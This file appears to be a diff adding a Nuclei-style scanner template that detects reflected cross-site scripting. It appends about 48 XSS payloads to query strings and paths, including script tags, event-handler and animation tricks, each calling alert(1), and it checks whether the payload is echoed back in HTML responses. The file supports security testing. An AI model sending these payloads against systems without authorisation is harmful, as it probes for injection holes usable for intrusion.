@@ -1,0 +1,93 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<video controls autoplay>"
+        - "<menuitem onclick=\"alert(1)\">test</menuitem>"
+        - "<script>alert(1)</script>"
+        - "<body id=x tabindex=1 onfocusin=alert(1)></body><input autofocus>"
+        - "<del onkeyup=\"alert(1)\" contenteditable>test</del>"
+        - "<iframe/onerror=\"javascript:javascript:alert(1)\"></iframe/onerror>"
+        - "<frame onkeydown=\"alert(1)\" contenteditable>test</frame>"
+        - "<script>alert(1)</script><noscript onkeypress=\"alert(1)\" contenteditable>test</noscript>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>"
+        - "<style>@keyframes slidein {}</style><figcaption style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></figcaption>"
+        - "<font id=x tabindex=1 onfocusin=alert(1)></font>"
+        - "<marquee><div style=\"x:\\expression(javascript:alert(1)\">"
+        - "<font onpaste=\"alert(1)\" contenteditable>test</font>"
+        - "<canvas draggable=\"true\" ondragleave=\"alert(1)\">test</canvas>"
+        - "<style>@keyframes slidein {}</style><figcaption style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></figcaption>"
+        - "<style>:target {color:red;}</style><bdi id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></bdi>"
+        - "<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input autofocus>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<style>:target {color:red;}</style><menu id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></menu>"
+        - "<svg><bdi onload=alert(1)"
+        - "<details onkeyup=\"alert(1)\" contenteditable>test</details>"
+        - "<plaintext onclick=\"alert(1)\">test</plaintext>"
+        - "<optgroup draggable=\"true\" ondragenter=\"alert(1)\">test</optgroup>"
+        - "<IMG SRC=x onblur=alert(1)><"
+        - "<style>:target {color:red;}</style><time id=x style=\"transition:color 1s\" ontransitionrun=alert(1)></time>"
+        - "<;HEAD>;"
+        - "<svg/onload=\"alert(1)\""
+        - "<style>@keyframes slidein {}</style><bgsound style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bgsound>"
+        - "<style>@keyframes x{}</style><summary style=\"animation-name:x\" onanimationend=\"alert(1)\"></summary>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><dialogitem ondragover=alert(1) contenteditable>drop here</dialogitem>"
+        - "<iframe><script>alert(1)</script></iframe>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>"
+        - "<picture onclick=\"alert(1)\">test</picture>"
+        - "<script>alert(1)</script>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas>"
+        - "<script>alert(1)</script>"
+        - "<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub>"
+        - "<style>:target {color:red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>"
+        - "&lt;DIV STYLE=&quot;background-image:url(javascript:alert(&apos;XSS&apos;));&quot;&gt;"
+        - "<SCRIPT>alert('XSS');</SCRIPT>"
+        - "<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>"
+        - "<audio autoplay controls ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<menuitem onclick=\"alert(1)\">test</menuitem>"
+        - "<details draggable=\"true\" ondragstart=\"alert(1)\">test</details>"
+        - "<script>alert(\"XSS\");</script><noscript id=xss-payload-list />"
+        - "<style>@keyframes x{}</style><script style=\"animation-name:x\" onanimationstart=\"alert(1)\"></script>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
